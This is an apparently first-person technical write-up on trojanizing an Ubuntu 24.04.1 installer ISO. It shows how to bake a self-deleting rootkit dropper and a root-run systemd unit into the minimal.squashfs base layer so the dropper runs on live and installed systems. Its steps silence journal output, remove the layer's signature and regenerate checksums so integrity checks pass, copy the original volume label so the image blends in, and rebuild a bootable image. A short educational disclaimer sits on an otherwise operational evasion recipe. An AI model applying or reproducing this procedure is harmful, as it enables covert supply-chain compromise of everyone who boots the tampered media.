# Kernel Implant on Linux Operating Systems (Installer ISO): Filesystem Layer Injection of a Rootkit Dropper for Root Execution on Live and Installed Systems

## Overview

I modified an Ubuntu Desktop LTS ISO by baking a compiled ELF rootkit dropper (`implant`) and a native systemd unit directly into the live filesystem's **base layer** (`casper/minimal.squashfs`). Because this base layer is the one Casper overlays at boot for the Live session **and** the one the installer writes to the target disk under the default install source, the dropper executes automatically as root on every boot of the modified media whether the user picks "Try Ubuntu" or completes an install. Once the rootkit confirms successful installation, the dropper deletes itself from disk, leaving no first-stage artifact behind.

The method itself is not Ubuntu-specific. Ubuntu's live media is built on Casper, which overlays a set of SquashFS images as `/` and runs systemd units from `/etc/systemd/system/`. Any Casper-based Ubuntu-derived ISO that uses the same layered squashfs scheme and systemd structure can be treated the same way. I targeted Ubuntu 24.04.1 Desktop because that was the system I had in front of me, and the guide below is written against that target.

The goal was simple: get my dropper into the live filesystem so that, on every boot of the modified media or of an installed system, `implant` runs as root, deploys the rootkit, and removes itself from disk once the rootkit confirms installation. No manual post-install steps, no extra package installation on the target. The dropper runs as root on the first boot, hands control to the rootkit, and leaves no first-stage artifact behind.

I chose the root-filesystem layer editing method over a plaintext preseed/autoinstall approach for a specific reason. The autoinstall `late_command` lives in a plaintext YAML file on the ISO, so anyone can run `grep late_command` and read the entire playbook. The root-filesystem layer method puts the dropper and the systemd unit inside a compressed SquashFS image (`casper/minimal.squashfs`). To find them, an analyst has to extract the layer and diff the entire root filesystem against a known-good build. There is no shortcut. That is the stealth gain I was after.

I used a native systemd unit. It is one file plus one symlink, uses the same mechanism every other service on the system uses, and does not stand out as an anomaly. There is no extra shell wrapper, no legacy compatibility path, and no additional artifact beyond what a normal service ships.

**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying rootkits on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements.

---

## What Is a Self-Cleaning Rootkit Dropper?

A rootkit dropper is a first-stage binary whose job is to deliver and install the second-stage rootkit. It is not the rootkit itself. It is the loader that places the rootkit on disk, wires it into the boot process, and then gets out of the way.

A **self-cleaning** dropper goes one step further. After the rootkit confirms successful installation, the dropper removes its own binary, its systemd unit, and the enable symlink from disk. The first-stage artifact disappears. Only the rootkit remains.

In this work, the dropper is an ELF binary I named `implant`. It runs as root at boot, copies the rootkit payload into a persistent location, installs the rootkit's own service or kernel module, waits for the rootkit to signal success, and then deletes itself. The rootkit then takes over the concealment work: hiding its process, its files, its systemd unit, and its network activity.

This distinction matters for the forensic analysis later. The dropper is a short-lived root process that leaves nothing behind on success. The rootkit is the long-lived hidden component. If the dropper succeeds, offline disk analysis after a successful install shows only whatever the rootkit chose to leave. If the dropper fails partway, it can choose to remain on disk for debugging or remove itself anyway depending on how I built it. I built mine to remove itself only on confirmed success.

The dropper's contents are mine. This write-up does not prescribe them, but I built it to run silently, install the rootkit, verify the install, self-delete on success, and exit cleanly so the systemd unit reports success.

---

## What Is a Kernel Implant?

A kernel implant is malicious or research-oriented software that embeds itself into the operating system kernel, the core component managing hardware, memory, and system calls. By operating at this privilege level, it gains near-total control over the system while remaining extremely difficult to detect.

Common kernel implant techniques include:

| Technique | Description |
|-----------|-------------|
| LKM (Loadable Kernel Module) | Loads malicious code as a kernel module |
| ftrace hooking | Intercepts kernel functions via ftrace |
| Syscall hooking | Hijacks system calls to hide artifacts |
| eBPF abuse | Uses extended Berkeley Packet Filter for covert operations |

By bundling such an implant into an Ubuntu ISO, the implant executes with root privileges the moment the live system (or installed system) boots, before most security tooling is even initialized. The dropper is the first stage that installs and wires this second stage in.

---

## Prerequisites

Before starting, I installed the required tools:

```bash
sudo apt update
sudo apt install -y xorriso squashfs-tools rsync
```

| Tool | Purpose |
|------|---------|
| xorriso | Extract and rebuild ISO images while preserving boot data |
| squashfs-tools | Extract and repack the compressed filesystem layers |
| rsync | Copy files while preserving permissions |

**Disk space requirement**: Approximately 4x the ISO size for working directories. Ubuntu 24.04.1 Desktop is roughly 6 GB, so I planned for at least 24 GB of free space.

**Binary requirements**:
- The dropper binary must be statically linked OR all its shared library dependencies must already exist in the base Ubuntu image
- The binary must have the execute bit set

---

## Working Directory Setup

I created the project directory and placed the ISO inside it. Every command in this write-up runs from that directory.

```bash
mkdir -p ~/Kernel_Implant
cd ~/Kernel_Implant
mv /path/to/ubuntu-24.04.1-desktop-amd64.iso .
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/49fe49f5-f332-4081-8fac-24f46cb8c369) |

I verified the directory contents:

```bash
ls -al
```

Expected output:

```
drwxrwxr-x    2 localhost localhost       4096 Oct 20 03:58 .
drwx--x---+ 142 localhost localhost      12288 Oct 20 03:59 ..
-rw-r--r--    1 root      root      6203355136 Oct 20 03:58 ubuntu-24.04.1-desktop-amd64.iso
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/89919654-0022-43d1-9f39-d2379d35651e) |

I also placed my compiled ELF rootkit dropper in the same directory and named it `implant`.

My project layout looked like this:

```
~/Kernel_Implant/
├── isomount/             # temporary mount point for the original ISO
├── extracted/            # extracted ISO tree, modified in place
├── squashfs-root/        # extracted base filesystem layer
├── ubuntu-24.04.1-desktop-amd64.iso   # original ISO
├── implant               # my compiled ELF rootkit dropper
└── custom-ubuntu-implant.iso          # rebuilt ISO (produced by this work)
```

---

## Step 1: Extract the ISO Contents

Before touching anything, I captured the original ISO's El Torito and hybrid boot report. This is the reference I would compare against after the rebuild, so I did not skip it.

```bash
xorriso -indev ~/Kernel_Implant/ubuntu-24.04.1-desktop-amd64.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/original_torito.txt 2>&1
cat ~/Kernel_Implant/original_torito.txt
```

The output reported the exact `xorriso -as mkisofs` arguments that reproduce the boot structure. On Ubuntu 24.04.1, the critical lines were:

```
-V 'Ubuntu 24.04.1 LTS amd64'
--modification-date='2024082716232600'
--grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'ubuntu-24.04.1-desktop-amd64.iso'
--protective-msdos-label
-partition_cyl_align off
-partition_offset 16
--mbr-force-bootable
-append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'ubuntu-24.04.1-desktop-amd64.iso'
-appended_part_as_gpt
-iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7
-c '/boot.catalog'
-b '/boot/grub/i386-pc/eltorito.img'
-no-emul-boot
-boot-load-size 4
-boot-info-table
--grub2-boot-info
-eltorito-alt-boot
-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'
-no-emul-boot
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/789de499-edbd-4245-beba-7036e3744845) |

**Key differences from older Ubuntu releases**: Ubuntu 24.04 no longer uses ISOLINUX for legacy BIOS boot. The boot image is now `/boot/grub/i386-pc/eltorito.img`, and the EFI boot image is not a file in the ISO filesystem, it is an **appended EFI partition**. The `-report_el_torito as_mkisofs` output reflects this.

I then mounted the ISO and extracted its contents:

```bash
cd ~/Kernel_Implant
mkdir isomount
sudo mount -o loop ubuntu-24.04.1-desktop-amd64.iso isomount
rsync -a isomount/ extracted
sudo umount isomount
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/16671e74-b814-4d38-99f5-527df376c167) |

Using rsync preserves file permissions and symbolic links, which is critical for a bootable ISO.

I inspected the layout to identify which squashfs image is the actual desktop root filesystem:

```bash
ls extracted
# saw: boot  boot.catalog  casper  dists  EFI  install  md5sum.txt  pool  preseed  ubuntu

ls -lh extracted/casper/
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/ea67a131-d61c-4d9c-b1f3-cbea8a1d72ed) |

The `casper/` directory did **not** contain a single `filesystem.squashfs` file. It contained many squashfs images, one per install variant and per language. The relevant ones were:

```
filesystem.manifest
filesystem.size
initrd                           (75 MB, Casper boot initramfs, NOT the installer's)
install-sources.yaml
minimal.squashfs                 (1.75 GB, minimal base)
minimal.standard.live.squashfs   (917 MB, standard desktop live layer)
minimal.standard.squashfs        (494 MB, standard layer, no live bits)
minimal.<lang>.squashfs          (16 MB each, per-language minimal variants)
minimal.enhanced-secureboot*.squashfs
...
vmlinuz
```

**This is the most important layout detail I had to get right, and it was also where my first attempt failed.** Ubuntu 24.04.1 Desktop does not ship a single `filesystem.squashfs` at the top of `casper/`. Instead it uses a layered squashfs scheme:

- **`minimal.squashfs`** (1.75 GB): the minimal base Ubuntu root filesystem. This is the layer the default installer writes to disk and the base Casper overlays for the Live session.
- **`minimal.standard.live.squashfs`** (917 MB): the "standard" desktop layer on top of the minimal base, used by the Live session.
- **`minimal.standard.squashfs`** (494 MB): the standard layer without the Live-specific bits.
- **`minimal.standard.<lang>.squashfs`**: per-language variants.
- **`minimal.enhanced-secureboot*.squashfs`**: secureboot variants.
- **`minimal.<lang>.squashfs`**: minimal base per-language variants.

Casper overlays these in order at boot. The Live desktop you see is the union of the base plus the standard layer (plus the language layer, if selected).

**How the layer stack is selected**: I checked the grub config on the ISO:

```bash
cat extracted/boot/grub/grub.cfg
```

It contained no `layerfs-path` line. The menu entries are just:

```
menuentry "Try or Install Ubuntu" {
        set gfxpayload=keep
        linux   /casper/vmlinuz  --- quiet splash
        initrd  /casper/initrd
}
menuentry "Ubuntu (safe graphics)" {
        set gfxpayload=keep
        linux   /casper/vmlinuz nomodeset  --- quiet splash
        initrd  /casper/initrd
}
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/52b79c3b-1917-4561-8866-886c8681613a) |

There is no explicit leaf-layer selector in the grub config. Casper reads the contents of `casper/` and `install-sources.yaml` at boot and assembles the overlay stack itself. The grub config only tells it which kernel and which initrd to use.

I then inspected `install-sources.yaml`, which defines the installable sources and maps each one to its squashfs layer:

```bash
cat extracted/casper/install-sources.yaml
```

The output was:

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/958d5834-8bd6-4501-95f6-7e167eb5961f) |

**This is the key mapping I had to understand.** There are two installable sources:

1. **`ubuntu-desktop-minimal`** (default: true): a minimal but usable Ubuntu Desktop. Its `path` is `minimal.squashfs`. This is the layer the installer writes to disk when the user selects the default (minimized) desktop install.
2. **`ubuntu-desktop`** (default: false): a full featured Ubuntu Desktop. Its `path` is `minimal.standard.squashfs`. This is the layer written when the user selects the full desktop install.

Both sources are `type: fsimage-layered`, which means each is a base layer plus additional layers stacked on top. The `path` field points at the **base** of the stack for that source. The `variations` map lists alternative bases for that source (for example, the enhanced-secureboot variants). The Live session overlays the base plus the desktop additions; the installer writes the base to the target disk.

**What this means for targeting the dropper:**

- The default install (`ubuntu-desktop-minimal`) writes `minimal.squashfs` to disk. That is the layer I want the dropper in.
- The full desktop install (`ubuntu-desktop`) writes `minimal.standard.squashfs` to disk. That is a different layer.
- The Live session overlays the base plus the standard layer, so the base is visible in both.

My first attempt put the dropper in `minimal.standard.live.squashfs`, which is the Live-session leaf layer. That is not the base of either install source, so it did not reach the installed disk. The correct target is the base of the source the user installs. For the default source, that is `minimal.squashfs`.

**Targeting `minimal.squashfs` means the dropper is present in both the Live session and the default installed system**: the Live session overlays the base plus the standard layers, so the base's `/usr/bin/implant` is visible there, and the installer writes the same base to disk when the user selects the default source, so the installed system has it too. That is the correct target for a dropper that needs to run in both contexts under the default install path.

If I wanted to cover the full-desktop source as well, I would repeat the same procedure against `minimal.standard.squashfs`, which is the base of the `ubuntu-desktop` source. That is a separate layer and a separate injection. For this write-up I targeted the default source, `minimal.squashfs`, because it is the layer the default installer writes and the layer the Live session overlays.

`casper/initrd` is the Casper boot initramfs. It is not a Debian-installer initrd and does not contain `finish-install.d/`.

---

## Step 2: Extract the Base Filesystem Layer

I extracted the base layer:

```bash
cd ~/Kernel_Implant
sudo unsquashfs -d squashfs-root extracted/casper/minimal.squashfs
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/b016b57f-3ae6-4f9d-bcac-fceac9b1424b) |

This created a `squashfs-root/` directory. I listed the top level:

```bash
ls squashfs-root
# saw: bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/6881938d-d02a-4afb-87c8-a910591a2351) |

**Unlike the Live leaf layer**, the base layer contains the full root filesystem skeleton: `bin`, `lib`, `sbin`, `opt`, `home`, `media`, `mnt`, `proc`, `sys`, `tmp`, and the rest. That includes `usr/bin/` and `usr/local/bin/`, both of which exist in this layer. This is the layer that gets installed to disk and that Casper overlays for the Live session, so placing the dropper here puts it on **both** the installed system and the Live session.

I confirmed `usr/bin/` exists in the base layer:

```bash
ls squashfs-root/usr
# saw: bin  games  include  lib  lib64  libexec  local  sbin  share  src

ls squashfs-root/usr/bin | head
# saw real binaries, usr/bin exists in this layer
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/f67b2dc4-718f-40b9-8773-7e21f5a3135e) |

I placed the dropper in `usr/bin/`. It is the conventional location for system binaries on Ubuntu, it already exists in the base layer, and it is less remarkable than a custom directory. `/usr/local/bin/` also exists in the base layer and is a valid alternative; either works. I chose `usr/bin/` for consistency with the rest of the system and because the base layer already ships real binaries there.

---

## Step 3: Insert the Rootkit Dropper

This is the only modification you need to make. No package installation, no system changes. Just the dropper binary and a native systemd unit.

### 3.1 Copy the Dropper Binary Into the Base Layer

From my host machine (outside the chroot), I copied the compiled ELF dropper into `usr/bin/` of the extracted base layer:

```bash
sudo cp ~/Kernel_Implant/implant squashfs-root/usr/bin/implant
sudo chmod 755 squashfs-root/usr/bin/implant
sudo chown root:root squashfs-root/usr/bin/implant
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/e37a46de-da33-4321-b0c6-1d6cfff6eb6b) |

**Critical**: The binary must have the execute bit set (755). Even as root, Linux will refuse to execute a file without the x permission.

I verified the dropper was a valid ELF:

```bash
file squashfs-root/usr/bin/implant
# saw: ELF 64-bit LSB executable, x86-64, ...
```

If the dropper is statically linked, it will run on any system. If it is dynamically linked, its dependencies must already be present in the base layer:

```bash
ldd ~/Kernel_Implant/implant
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/4d100411-1c8f-4eb8-be4e-a8a55272248f) |

Since we are not installing anything, all required libraries must already exist in the base Ubuntu image. If a library is missing, the dropper will fail to run.

### 3.2 Create the systemd Unit

I created the unit file directly in the extracted base layer. This is the only auto-run mechanism, a first-class systemd service, no shell wrapper, no compatibility path.

```bash
sudo nano squashfs-root/etc/systemd/system/implant.service
```

I pasted:

```ini
[Unit]
Description=Implant Service
After=local-fs.target

[Service]
Type=oneshot
ExecStart=/usr/bin/implant
RemainAfterExit=yes
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/2269952e-afb5-4c75-be5b-73660c012cf0) |

**Explanation of key lines:**

| Line | Purpose |
|------|---------|
| `Type=oneshot` | Systemd starts the unit once, waits for it to finish, and treats it as active. Correct for a dropper that runs, installs the rootkit, and exits. |
| `ExecStart=/usr/bin/implant` | The dropper binary path. |
| `RemainAfterExit=yes` | Keeps the unit marked active after the process exits. Without this, systemd would consider the unit failed when the dropper exits. |
| `User=root` | Explicit root. Redundant since system units run as root by default, but makes the intent clear and guards against a future default change. |
| `StandardOutput=null` / `StandardError=null` | Suppresses logging to the journal. This is the stealth choice. For debugging, change to `journal` or `file:/var/log/implant.log`. |
| `After=local-fs.target` | Ensures the filesystem is mounted before the dropper runs. Does not guarantee network readiness. |

**Design notes on the unit:**

- **First-class systemd service.** The unit is indistinguishable in structure from any other service on the system. It uses the standard `[Unit]`, `[Service]`, and `[Install]` sections with the same directives every package uses.
- **`Type=oneshot` with `RemainAfterExit=yes`** is the right choice for a dropper. Systemd starts it once, waits for it to finish installing the rootkit, and then treats the unit as active. It does not restart on failure, which would be noisy. The dropper installs the rootkit's own service or module, and the rootkit takes over from there.
- **No `Restart=` directive.** A restart loop on failure would be noisy and would show up in `systemctl status`. A failed unit that stays failed is quieter.
- **No `WantedBy=graphical.target`.** `multi-user.target` is the standard boot target and is reached on both server and desktop installs. Using `multi-user.target` means the dropper runs even if the graphical session fails to start.
- **`StandardOutput=null`** keeps the journal clean. An analyst running `journalctl -u implant.service` sees nothing. If the rootkit writes its own logs elsewhere, that is the rootkit's responsibility.

### 3.3 Enable the Unit

Systemd enables a unit by creating a symlink in the appropriate `.wants` directory. I created that symlink manually inside the extracted base layer:

```bash
sudo mkdir -p squashfs-root/etc/systemd/system/multi-user.target.wants
sudo ln -sf /etc/systemd/system/implant.service \
    squashfs-root/etc/systemd/system/multi-user.target.wants/implant.service
```

I verified the symlink:

```bash
ls -la squashfs-root/etc/systemd/system/multi-user.target.wants/implant.service
# Should show: lrwxrwxrwx ... -> /etc/systemd/system/implant.service
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/4d87d659-6c07-453d-b79f-1b4e0b4695ae) |

**Why the symlink and not `systemctl enable`**: The extracted layer is not a running system. `systemctl enable` operates on the running host's systemd, not on the extracted tree. The symlink is exactly what `systemctl enable` would create, and it is the same mechanism every package uses when it ships an enabled unit. Creating it manually is the correct approach for an offline filesystem edit.

**Note on `Alias=`**: I did not use an `Alias=` directive. `Alias=` creates an additional name for the unit but does not enable it. The `.wants` symlink is what actually enables the unit at boot. The `[Install]` section's `WantedBy=` directive is what `systemctl enable` reads to decide where to put the symlink; since I am creating the symlink manually, the `WantedBy=` line is documentation rather than mechanism. I kept it for clarity and for anyone who later runs `systemctl enable` on the target.

### 3.4 How It Works in Both Contexts

On boot, systemd reads the `multi-user.target.wants/` directory and starts every unit symlinked there. `implant.service` is among them. Systemd starts it as root, waits for the `oneshot` process to finish, and marks the unit active because of `RemainAfterExit=yes`. The dropper runs exactly once per boot, as root, before the login prompt.

**Live session**: Casper overlays `minimal.squashfs` (base) plus `minimal.standard.live.squashfs` (leaf) plus the language layer. The dropper and unit are in the base, so they are visible in the merged root. Systemd starts `implant.service` from the merged `/etc/systemd/system/multi-user.target.wants/`. The dropper runs, installs the rootkit, and self-cleans. The rootkit takes over. Because the Live session's root is an overlay backed by the ISO, the self-clean removes the artifacts from the ephemeral overlay, not from the ISO. The media remains unchanged.

**Installed system**: The installer writes the base layer to disk under the default source `ubuntu-desktop-minimal`. The dropper and unit are in that layer, so they are present on the installed disk. On first boot, systemd starts `implant.service`, the dropper runs, installs the rootkit, and self-cleans. The artifacts are removed from the installed disk. Only the rootkit remains.

**The same artifact set covers both contexts**, because the base layer is the one both paths use.

**Caveats I kept in mind:**

- **Network readiness**: `After=local-fs.target` does not guarantee the network is up. If the dropper needs network access to fetch the rootkit, add `After=network-online.target` and `Wants=network-online.target` to the unit, or have the dropper retry internally. `network-online.target` itself can be slow or unreliable on some configurations, so an internal retry loop in the dropper is more robust.
- **Process termination**: With `Type=oneshot` and `RemainAfterExit=yes`, systemd considers the unit active after `ExecStart` returns. If the dropper forks a background process, that process is not tracked by systemd and will not be terminated on shutdown unless the dropper handles it.
- **Logging**: `StandardOutput=null` and `StandardError=null` suppress journal output. To capture logs for debugging, change to `journal` or `file:/var/log/implant.log`. For a production deployment, suppressing is the stealth choice.
- **Module signing**: If the rootkit loads an unsigned kernel module, Ubuntu 24.04's Secure Boot enforcement will reject it. The unit will start, the module load will fail, and `StandardError=null` will hide the error. Disable Secure Boot or sign the module.
- **Live session immutability**: In the Live session, the dropper's self-clean removes artifacts from the in-memory overlay. The ISO media is unchanged. If the user installs after the dropper has already run in the Live session, the installer writes the original base layer from the ISO, not the modified in-memory overlay, so the dropper is present again on the installed disk. That is the desired behavior.
- **Install source selection**: The default install source is `ubuntu-desktop-minimal`, which uses `minimal.squashfs`. If the user selects the full desktop source `ubuntu-desktop` instead, the installer writes `minimal.standard.squashfs`, which does not contain my dropper. For the default source, the dropper reaches the disk. For the full source, it does not, unless I also inject into `minimal.standard.squashfs`.

---

## How the Self-Clean Works

The self-clean is a property of the dropper binary, not of the deployment mechanism. The systemd unit only guarantees the dropper runs as root. What the dropper does after that is its own logic.

The sequence I built into the dropper is this:

1. Install the rootkit payload to its persistent location.
2. Install the rootkit's service or kernel module.
3. Start the rootkit and wait for it to signal readiness.
4. If the rootkit confirms success, remove `/usr/bin/implant`, `/etc/systemd/system/implant.service`, and `/etc/systemd/system/multi-user.target.wants/implant.service`.
5. Exit 0.

The key detail is step 4. The dropper cannot delete its own systemd unit while systemd still references it in the current transaction. The safe approach is to schedule the removal to happen just after the unit finishes, or to have the dropper remove the unit file and symlink but leave the binary in place until the next boot, at which point the rootkit removes it. Either way, the artifact that remains visible is only present for a short window.

If the rootkit does not confirm success, the dropper leaves everything in place. That is a deliberate choice. A failed install should be debuggable, and leaving the dropper and unit on disk makes the failure visible. It also means a failed dropper does not silently disappear, which would leave the operator wondering whether the technique worked at all.

The self-clean does not affect the deployment mechanism. The systemd unit writes the dropper and the unit; the dropper removes them on success. The two are independent.

**In the Live session**, the self-clean removes the artifacts from the overlay, not from the ISO. If the user reboots the same media, the dropper is present again, because Casper re-overlays the base layer from the ISO. That is expected: the Live session is ephemeral by design, and the dropper is re-deployed on each boot of the media. The self-clean matters for the installed system, where the artifacts would otherwise persist indefinitely.

---

## Step 4: Repack the Base Filesystem Layer

### Remove Old squashfs

```bash
sudo rm extracted/casper/minimal.squashfs
```

### Create New squashfs

```bash
cd ~/Kernel_Implant
sudo mksquashfs squashfs-root extracted/casper/minimal.squashfs \
    -comp xz \
    -progress
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/7d62ebf4-0b39-413c-828e-a96ad3b9eed5) |

The `-comp xz` flag uses XZ compression for a smaller layer size. The process may take several minutes depending on the system. The original base layer is zstd-compressed; xz is still valid and produces a smaller layer at the cost of slower decompression at boot. The base layer is large (1.75 GB uncompressed), so the repack takes longer than the Live leaf layer would have.

### Update the Layer Size

The `.size` file records the uncompressed size of the layer and is used by the installer. I updated the base layer's size file:

```bash
sudo du -sx --block-size=1 extracted/casper/minimal.squashfs | cut -f1 | sudo tee extracted/casper/minimal.size
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/3272137e-dcf8-4e7f-99f2-e7cf51b96c90) |

**Important for the layered layout**: I updated only the `.size` file that corresponds to the base layer I modified. The other layers (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`, etc.) are untouched and their `.size` files remain valid. If I had modified the Live leaf layer instead, I would update `minimal.standard.live.size`.

### Regenerate the GPG Signature (if present)

The original ISO ships a `.squashfs.gpg` detached signature next to each layer. If the installer verifies that signature, my modified base layer will fail verification. I had two choices:

1. **Remove the `.gpg` file for the modified layer**, so the installer has nothing to verify against and skips the check. This is the quieter option if the installer treats a missing signature as "no signature to check" rather than "tampered."
2. **Re-sign the layer with a key the installer trusts**, which I cannot do without Ubuntu's signing key.

I removed the signature for the modified base layer:

```bash
sudo rm extracted/casper/minimal.squashfs.gpg
```

**Stealth consideration**: Removing the `.gpg` file is visible to anyone diffing the ISO against a known-good build, but a modified layer with a stale signature is also visible, and more obviously wrong. Removing it is the lesser evil. If I wanted to preserve the appearance of the original ISO more closely, I could leave the stale `.gpg` in place and let the installer's check fail, but that produces a failed-integrity-check dialog on boot, which is louder than a missing signature. Removing it is the quieter choice in practice.

### Update MD5 Checksums

Ubuntu uses `md5sum.txt` to verify ISO integrity. I regenerated it after modifying the layer:

```bash
cd extracted
sudo rm md5sum.txt
sudo find . -type f -print0 | xargs -0 md5sum | sudo tee md5sum.txt
cd ..
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/b09496b6-23df-4145-b69a-cd5b19b85029) |

**Stealth consideration**: If I wanted to avoid detection of a modified ISO, I could skip regenerating `md5sum.txt`. However, that would cause integrity check warnings on boot and may trigger security tooling. Regenerating it is the quieter choice, since the checksums will match the modified content and the boot-time check will pass.

---

## Step 5: Rebuild the ISO (UEFI-Aware)

The rebuild must reproduce the boot structure I captured in Step 1. A naive `mkisofs` rebuild loses the GPT structure and the appended EFI partition, and the resulting ISO will not boot on modern UEFI machines.

The command below uses the arguments from the `-report_el_torito as_mkisofs` output:

```bash
ORIG_ISO="$(cd ~/Kernel_Implant && pwd)/ubuntu-24.04.1-desktop-amd64.iso"
cd ~/Kernel_Implant

sudo xorriso -as mkisofs \
    -V 'Ubuntu 24.04.1 LTS amd64' \
    --modification-date='2024082716232600' \
    --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:"$ORIG_ISO" \
    --protective-msdos-label \
    -partition_cyl_align off \
    -partition_offset 16 \
    --mbr-force-bootable \
    -append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::"$ORIG_ISO" \
    -appended_part_as_gpt \
    -iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7 \
    -c '/boot.catalog' \
    -b '/boot/grub/i386-pc/eltorito.img' \
    -no-emul-boot \
    -boot-load-size 4 \
    -boot-info-table \
    --grub2-boot-info \
    -eltorito-alt-boot \
    -e '--interval:appended_partition_2_start_3026280s_size_10144d:all::' \
    -no-emul-boot \
    -o ~/Kernel_Implant/custom-ubuntu-implant.iso \
    extracted/
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/71727081-24e7-47ff-8d39-c7b141dfeb1d) |

**Notes on the arguments:**

- **`--grub2-mbr --interval:...:$ORIG_ISO`**: the GRUB2 MBR boot code is taken from the first 16 sectors of the original ISO file. I kept the original ISO path correct and did not point it at the new tree.
- **`-append_partition 2 ... --interval:...:$ORIG_ISO`**: the EFI system partition is extracted from the original ISO's byte range and appended to the new ISO. The byte range `12105120d-12115263d` and the partition GUID `28732ac11ff8d211ba4b00a0c93ec93b` must match the original. If the original ISO's partition layout differs (for example, on a different point release), these values will differ and must be taken from `original_torito.txt`.
- **`-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'`**: the El Torito EFI boot entry points to the newly appended partition, not to a file in the ISO filesystem. The start and size values are taken from the original report.
- **`-isohybrid-gpt-basdat`** was replaced with `-appended_part_as_gpt` on 24.04, because the EFI image is an appended partition rather than an embedded file. The `-report_el_torito as_mkisofs` output is authoritative here; do not hand-edit these flags.
- **The volume label is copied from the original ISO**, making the modified image blend in with legitimate Ubuntu media. This is a deliberate stealth choice.

**Critical warning for 24.04**: Because the EFI partition is appended at a specific byte offset, any change to the size of the ISO filesystem content (which adding the dropper does) can shift the offset and break UEFI boot if the arguments are not exact. The `-report_el_torito as_mkisofs` output is not optional guidance, it is the exact recipe for this ISO. If the rebuilt ISO does not boot in OVMF, the first thing to check is that the `--interval` byte ranges match the original.

The El Torito and isohybrid arguments are specific to how the target ISO was built, not to the technique. On a different Ubuntu release or distribution, the same step applies, but the boot arguments come from that ISO's own `-report_el_torito as_mkisofs` output.

---

## Step 6: Verifying the Rebuilt ISO Boot Structure

After the build, I repeated the inspection from Step 1 against the new ISO and compared it to the saved reference:

```bash
xorriso -indev ~/Kernel_Implant/custom-ubuntu-implant.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/rebuilt_torito.txt 2>&1
diff -u ~/Kernel_Implant/original_torito.txt ~/Kernel_Implant/rebuilt_torito.txt
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/02b4506a-92ee-4708-860c-7d6608240aba) |

The diff should show only the ISO filename changing in the `--interval` paths and possibly the appended-partition start sector (because the filesystem grew). The boot-relevant lines must be identical:

```
--grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'...'
--append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'...'
-c '/boot.catalog'
-b '/boot/grub/i386-pc/eltorito.img'
--grub2-boot-info
-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'
```

Had any of those been missing or changed, the rebuild would have been wrong, and I would not have proceeded to testing.

> **Secure Boot note**: Modifying a squashfs layer and adding a systemd unit does not modify the bootloader binary or the appended EFI partition. The signature chain is unaffected, so a straightforward root-filesystem injection should not break Secure Boot. However, unsigned kernel modules loaded by the rootkit will be rejected unless Secure Boot is disabled or the module is signed. Ubuntu 24.04's kernel module signing enforcement is stricter than older releases.

---

## Step 7: Testing the Implant ISO

I always test in a virtual machine before writing to physical media. For UEFI testing, I used OVMF:

```bash
qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
    -bios /usr/share/ovmf/OVMF.fd
```

I checked that:

1. The system boots to the live desktop
2. The dropper is present at `/usr/bin/implant` (verify with `ls -la /usr/bin/implant`)
3. The unit is active (verify with `systemctl status implant.service`)
4. The rootkit is installed and the dropper has self-cleaned (verify with `ls -la /usr/bin/implant` after the unit runs; on a successful self-clean, the file is gone)

Because `StandardOutput=null` and `StandardError=null` are set, `journalctl -u implant.service` will show the unit start and stop but no process output. That is expected. If I need to debug, I temporarily change those to `journal` in the extracted unit file, repack, and rebuild.

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/812c7395-811d-4020-a9cf-e87e149810b0) |

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/2211347d-bdc3-4040-9b3c-db5b18958623) |

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/ed05e092-1f0b-48d2-9b56-09f4826c806d) |

### Testing with a Virtual Disk (to Test Installation)

To test the full install flow, I added a virtual disk:

```bash
qemu-img create -f qcow2 testdisk.qcow2 30G
qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
    -drive file=testdisk.qcow2,format=qcow2 \
    -enable-kvm -cpu host \
    -bios /usr/share/ovmf/OVMF.fd
```
